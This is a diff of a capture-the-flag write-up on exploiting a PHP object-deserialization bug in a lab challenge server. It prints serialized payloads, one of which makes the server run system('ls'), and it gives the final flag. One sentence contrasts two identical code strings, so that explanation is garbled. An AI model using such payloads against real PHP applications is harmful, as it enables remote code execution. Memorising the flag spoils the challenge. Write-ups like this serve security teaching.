@@ -6,8 +6,7 @@ As teacher say, our work is find out flag of challenge by exploiting the PHP ser
 
 ## The challenge
 Link: *http://45.122.249.68:10001*
-If you're lazy, you can see the quick code below:
-{%- gist #### %}
+If you're lazy, you can see the quick code [here](chall.php)
 
 ## Analytics
 By reading and following the code, we analysed the code and proposed a few judgments (*for convenient in handling, we get the code back local and handle on it*):
@@ -34,6 +33,7 @@ class User{
 We realize that at the line 5, author uses`$this->$name = $name;` instead of `$this->$name = $name;`.
 
 By *our test below*, we see that the output will add a "54010N" property into User object with the value as same as property's name.
+
 [](images/usertest.png)
 
 Moreover, the `$name` and `$is_admin` properties are changed to `Username` and `Useris_admin` ?? :smile: ??.  *What is special when author make that?* **(2)**
@@ -84,7 +84,9 @@ $code = serialize($showcolor);
 echo $code;
 ```
 > Output: `O:10:"Show_color":2:{s:5:"color";s:2:"ls";s:4:"type";O:4:"User":3:{s:10:"Username";N;s:14:"Useris_admin";b:0;s:3:"adu";s:3:"adu";}}`
+
 Using this output as payload:
+
 ![](images/wrong.png)
 
 The *ls* command is not execute and the server return a error. So we need to repair the payload.
@@ -93,6 +95,7 @@ The *ls* command is not execute and the server return a error. So we need to rep
 - Specialy, the server is not compile `system("ls")` command because the `adu` property have *adu* value rather than *system* value. So, the system will be compile *adu("ls")* instead of *system("ls")*. That is the reason why we must to change the value of `adu` property to *"system"*.
 
 Now, let's request by the changed payload: `O:10:"Show_color":2:{s:5:"color";s:2:"ls";s:4:"type";O:4:"User":3:{s:4:"name";N;s:8:"is_admin";b:1;s:3:"adu";s:6:"system";}}`:
+
 ![](images/rightway.png)
 
 Yeah, we are success when execute `system("ls")` on the server. Now our work is checking files and find out the flag because the string *"hi admin, here is your flag"* is not the flag :(((
@@ -107,3 +110,4 @@ Yeah, we are success when execute `system("ls")` on the server. Now our work is 
 
 ## Flag
 > **flag{n0j_l0j_pk4j_qju_l4y_l0j_dunq_nku_c0n_bu0m_d4u_r0j_l4j_b4y}**
+
